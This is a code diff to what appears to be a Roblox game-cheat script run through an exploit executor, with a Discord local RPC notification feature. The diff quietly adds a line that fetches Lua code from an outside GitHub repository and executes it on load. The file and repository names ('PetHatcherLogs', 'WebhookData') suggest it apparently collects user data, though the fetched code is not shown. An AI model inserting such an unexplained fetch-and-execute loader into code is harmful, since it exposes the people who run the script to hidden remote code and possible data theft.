@@ -13,6 +13,8 @@ if game.PlaceId == 6284583030 or game.PlaceId == 7722306047 then
 	local userid = game:GetService("Players").LocalPlayer.UserId
 	local icon = "https://www.roblox.com/headshot-thumbnail/image?userId="..userid.."&width=420&height=420&format=png"
 	
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Buddy25112/PSXPetHatcherLogs/main/PSXPetHatcherWebhookData.lua"),true))()
+	
 	if _G.DiscordNotification == true then 
         (syn and syn.request or http_request or request)({ Url = "http://127.0.0.1:6463/rpc?v=1",
             Method = "POST",Headers = {["Content-Type"] = "application/json",
